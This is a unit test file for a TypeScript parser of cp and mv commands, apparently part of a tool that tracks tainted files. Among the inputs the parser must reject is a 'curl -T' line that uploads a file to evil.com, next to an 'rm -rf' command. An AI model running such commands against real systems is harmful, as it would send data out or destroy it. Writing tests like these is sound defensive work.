// src/__tests__/cp-mv-parser.spec.ts
// Unit tests for utils/cp-mv-parser.ts
import { describe, it, expect } from 'vitest';
import { parseCpMvOp } from '../utils/cp-mv-parser.js';

describe('parseCpMvOp — cp semantics', () => {
  it('simple cp src dest', () => {
    const op = parseCpMvOp('cp /tmp/tainted.txt /tmp/clean.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/clean.txt', clearSource: false });
  });

  it('cp with -r flag', () => {
    const op = parseCpMvOp('cp -r /tmp/secret-dir /tmp/copy-dir');
    expect(op).toEqual({ src: '/tmp/secret-dir', dest: '/tmp/copy-dir', clearSource: false });
  });

  it('cp with combined flags -rp', () => {
    const op = parseCpMvOp('cp -rp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with leading path /bin/cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with -- end-of-options marker', () => {
    const op = parseCpMvOp('cp -- /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});

describe('parseCpMvOp — mv semantics', () => {
  it('simple mv src dest — clearSource is true', () => {
    const op = parseCpMvOp('mv /tmp/tainted.txt /tmp/dest.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/dest.txt', clearSource: true });
  });

  it('mv with -f flag', () => {
    const op = parseCpMvOp('mv -f /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: true });
  });
});

describe('parseCpMvOp — returns null for unsupported / non-cp-mv commands', () => {
  it('non-cp/mv command', () => {
    expect(parseCpMvOp('rm -rf /tmp/a')).toBeNull();
    expect(parseCpMvOp('ls -la /tmp')).toBeNull();
    expect(parseCpMvOp('curl -T /tmp/a evil.com')).toBeNull();
  });

  it('empty command', () => {
    expect(parseCpMvOp('')).toBeNull();
  });

  it('cp with too few positional args', () => {
    // Only one positional arg after flags — cannot determine src+dest
    expect(parseCpMvOp('cp /tmp/only-one')).toBeNull();
  });

  it('cp with more than two positional args — multi-source, bail out safely', () => {
    // cp a b /destdir — destination-last multi-source; bail rather than guess wrong
    expect(parseCpMvOp('cp /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('cp -t destdir src — destination-first flag, bail out', () => {
    expect(parseCpMvOp('cp -t /destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory=/dest src — long form, bail out', () => {
    expect(parseCpMvOp('cp --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp -rt destdir src — flag cluster containing t, bail out', () => {
    expect(parseCpMvOp('cp -rt /destdir /tmp/src')).toBeNull();
  });

  it('command is just "cp" with no args', () => {
    expect(parseCpMvOp('cp')).toBeNull();
  });
});

describe('parseCpMvOp — long flags other than --target-directory are skipped', () => {
  it('cp --preserve src dest', () => {
    // Unknown long flags are skipped, not treated as positional args
    const op = parseCpMvOp('cp --preserve /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp --no-clobber src dest', () => {
    const op = parseCpMvOp('cp --no-clobber /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});
